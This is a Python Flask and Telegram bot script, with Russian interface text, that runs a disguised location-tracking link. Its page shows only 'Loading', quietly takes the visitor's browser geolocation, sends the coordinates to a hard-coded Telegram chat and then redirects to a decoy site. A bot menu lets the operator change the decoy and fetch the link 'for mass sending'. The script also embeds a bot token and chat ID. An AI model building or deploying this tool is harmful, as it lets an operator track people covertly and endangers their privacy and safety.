from flask import Flask, request, render_template_string
import requests
import telebot
import threading
import os
from telebot import types

BOT_TOKEN = '7673156387:AAF6Eop_JRvOY1dncc5ObC_CdBsAsQF2VJU'
CHAT_ID = 651911888
RENDER_URL = 'https://geo-tracker-l5ui.onrender.com'
REDIRECT_FILE = 'redirect_url.txt'

app = Flask(__name__)
bot = telebot.TeleBot(BOT_TOKEN)

user_waiting_for_url = set()

def get_redirect_url():
    try:
        with open(REDIRECT_FILE, 'r') as f:
            url = f.read().strip()
            if url:
                return url
    except FileNotFoundError:
        pass
    return 'https://yandex.ru'  # URL по умолчанию

def set_redirect_url(url):
    with open(REDIRECT_FILE, 'w') as f:
        f.write(url)

def send_to_telegram(lat, lon):
    text = f"📍 Новая геолокация:\nШирота: {lat}\nДолгота: {lon}"
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": text}
    requests.post(url, data=data)

@app.route('/')
def serve_index():
    url = get_redirect_url()
    html = f'''
    <!DOCTYPE html>
    <html>
    <head><title>Загрузка...</title></head>
    <body>
    <script>
    navigator.geolocation.getCurrentPosition(pos => {{
        fetch('/send_location', {{
            method: 'POST',
            headers: {{'Content-Type': 'application/json'}},
            body: JSON.stringify({{
                latitude: pos.coords.latitude,
                longitude: pos.coords.longitude
            }})
        }});
        setTimeout(() => {{
            window.location.href = "{url}";
        }}, 1500);
    }}, err => {{
        setTimeout(() => {{
            window.location.href = "{url}";
        }}, 1500);
    }});
    </script>
    </body>
    </html>
    '''
    return render_template_string(html)

@app.route('/send_location', methods=['POST'])
def send_location():
    data = request.json
    lat = data.get('latitude')
    lon = data.get('longitude')
    if lat and lon:
        send_to_telegram(lat, lon)
        return {'status': 'ok'}
    return {'status': 'error'}, 400

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row('Изменить редирект', 'Скинуть ссылку')
    bot.send_message(message.chat.id, "Выбери действие:", reply_markup=markup)

@bot.message_handler(func=lambda m: m.text == 'Изменить редирект')
def ask_redirect(message):
    bot.send_message(message.chat.id, "Пришли новую ссылку для редиректа (начиная с http:// или https://):")
    user_waiting_for_url.add(message.chat.id)

@bot.message_handler(func=lambda m: m.chat.id in user_waiting_for_url)
def set_redirect_from_message(message):
    url = message.text.strip()
    if url.startswith('http://') or url.startswith('https://'):
        set_redirect_url(url)
        bot.send_message(message.chat.id, f"✅ Редирект установлен на:\n{url}")
        user_waiting_for_url.remove(message.chat.id)
    else:
        bot.send_message(message.chat.id, "❌ Ошибка: ссылка должна начинаться с http:// или https://. Попробуй ещё раз.")

@bot.message_handler(func=lambda m: m.text == 'Скинуть ссылку')
def send_render_link(message):
    bot.send_message(message.chat.id, f"Вот твоя ссылка для рассылки:\n{RENDER_URL}")

def run_bot():
    bot.infinity_polling()

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    threading.Thread(target=run_bot, daemon=True).start()
    app.run(host='0.0.0.0', port=port)
